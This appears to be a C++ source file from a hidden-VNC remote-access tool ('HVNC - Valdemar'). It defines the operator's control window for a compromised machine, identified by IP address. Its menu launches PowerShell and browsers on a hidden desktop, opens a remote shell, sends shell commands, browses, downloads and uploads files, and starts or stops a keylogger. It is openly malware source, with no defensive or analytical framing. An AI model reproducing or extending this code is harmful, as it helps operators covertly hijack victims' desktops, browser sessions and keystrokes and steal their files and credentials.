#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"

static const TCHAR *className    = TEXT("HiddenDesktop_ControlWindow");
static const TCHAR *titlePattern = TEXT("Desktop@%S | HVNC - Valdemar");

BOOL CW_Register(WNDPROC lpfnWndProc)
{
    WNDCLASSEX wndClass = {};
    wndClass.cbSize        = sizeof(WNDCLASSEX);
    wndClass.style         = CS_DBLCLKS;
    wndClass.lpfnWndProc   = lpfnWndProc;
    wndClass.hInstance     = GetModuleHandle(NULL);
    wndClass.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wndClass.hbrBackground = (HBRUSH)COLOR_WINDOW;
    wndClass.lpszClassName = className;
    wndClass.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
    wndClass.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    return RegisterClassEx(&wndClass);
}

HWND CW_Create(DWORD uhid, DWORD width, DWORD height)
{
    TCHAR title[100];
    IN_ADDR addr; addr.S_un.S_addr = uhid;
    wsprintf(title, titlePattern, inet_ntoa(addr));
    HWND hWnd = CreateWindow(
        className,
        title,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        width, height,
        NULL,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );
    if (!hWnd) return NULL;

    HMENU hMainMenu = CreateMenu();
    HMENU hSubMenu  = CreatePopupMenu();

    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::fullScreen,      TEXT("Toggle Fullscreen"));
    AppendMenu(hSubMenu, MF_SEPARATOR, 0, NULL);
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startExplorer,   TEXT("Start Explorer"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startRun,        TEXT("Run..."));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startPowershell, TEXT("Start PowerShell"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startChrome,     TEXT("Start Chrome"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startEdge,       TEXT("Start Edge"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startBrave,      TEXT("Start Brave"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startFirefox,    TEXT("Start Firefox"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::startIexplore,   TEXT("Start Internet Explorer"));

    AppendMenu(hSubMenu, MF_SEPARATOR, 0, NULL);

    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuShell,        TEXT("Open Shell"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuShellCommand, TEXT("Send Shell Command"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuFileManager,  TEXT("List Directory"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuDownloadFile, TEXT("Download File"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuUploadFile,   TEXT("Upload File"));
    AppendMenu(hSubMenu, MF_SEPARATOR, 0, NULL);
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuKeyloggerOn,  TEXT("Keylogger Start"));
    AppendMenu(hSubMenu, MF_STRING, SysMenuIds::menuKeyloggerOff, TEXT("Keylogger Stop"));

    AppendMenu(hMainMenu, MF_POPUP, (UINT_PTR)hSubMenu, TEXT("Commands"));
    SetMenu(hWnd, hMainMenu);

    ShowWindow(hWnd, SW_SHOW);
    return hWnd;
}
